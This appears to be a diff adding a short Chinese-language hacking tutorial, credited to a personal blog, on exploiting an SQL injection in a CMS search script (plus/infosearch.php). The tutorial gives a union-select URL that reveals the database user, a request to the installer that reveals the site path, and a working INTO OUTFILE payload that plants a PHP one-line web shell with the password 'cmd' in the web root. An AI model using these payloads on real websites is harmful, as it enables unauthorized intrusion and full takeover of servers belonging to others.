@@ -1,0 +1,17 @@
+
+1,安装目录install 未删除
+2,有 into outfile 权限 'root权限基本都有这个权限'
+我们可以先用语句来看下这个注入点的权限
+www.baidu.com/plus/infosearch.php?action=search&q=%cf'%20union%20select%201,2,user(),4,5,6/*
+如果爆出来为 root@localhost  就很有成功的希望拉
+首先要构造语句
+1,www.baidu.com/install/index.php?step=2
+这样先爆出安装目录,以及查看程序所有目录的写读权限
+假设爆出的站点根目录为D:\wwwroot
+构造语句
+2,www.baidu.com/plus/infosearch.php?action=search&q=%cf'%20union%20select%201,2,3,4,'<?php%20eval($_POST[cmd])?>',6+into+outfile+'D:\\wwwroot\\duizhang.php'+/*
+into outfile 写入目录 要把\转换为\\  要写的目录一定要有写权限 
+执行成功后会在 d:\wwwroot 导出刚刚写入的一句话php马 名称为duizhang.php 密码为cmd
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/54.html 
+
+
